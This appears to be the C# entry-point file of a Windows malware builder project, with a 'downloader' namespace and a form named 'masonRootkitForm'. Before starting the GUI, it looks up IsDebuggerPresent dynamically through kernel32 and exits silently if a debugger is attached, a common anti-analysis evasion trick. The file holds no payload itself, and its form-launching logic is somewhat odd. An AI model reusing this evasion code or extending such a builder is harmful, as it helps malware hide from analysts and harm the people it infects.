using downloader;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace builder
{
    static class Program
    {
        public class funs
        {
            [DllImport("kernel32.dll")]
            public static extern IntPtr GetModuleHandle(string lpModuleName);

            [DllImport("kernel32.dll")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool IsDebuggerPresentDelegate();

            public static bool IsDebuggerPresent()
            {
                IntPtr kernel32 = GetModuleHandle("kernel32.dll");
                if (kernel32 != IntPtr.Zero)
                {
                    IntPtr pIsDebuggerPresent = GetProcAddress(kernel32, "IsDebuggerPresent");
                    if (pIsDebuggerPresent != IntPtr.Zero)
                    {
                        IsDebuggerPresentDelegate isDebuggerPresent = (IsDebuggerPresentDelegate)Marshal.GetDelegateForFunctionPointer(pIsDebuggerPresent, typeof(IsDebuggerPresentDelegate));
                        return isDebuggerPresent();
                    }
                }
                return false;
            }
        }
        [STAThread]
        static void Main()
        {
            if (funs.IsDebuggerPresent())
            {
                return;
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Form1 masonRootkitForm = new Form1();
            Application.Run(masonRootkitForm);
            if (!masonRootkitForm.IsDisposed)
            {
                Form1 builderForm = new Form1();
                builderForm.FormClosed += (s, e) =>
                {
                    if (!masonRootkitForm.IsDisposed)
                    {
                        masonRootkitForm.Close();
                    }
                };
                Application.Run(builderForm);
            }
        }
    }
}
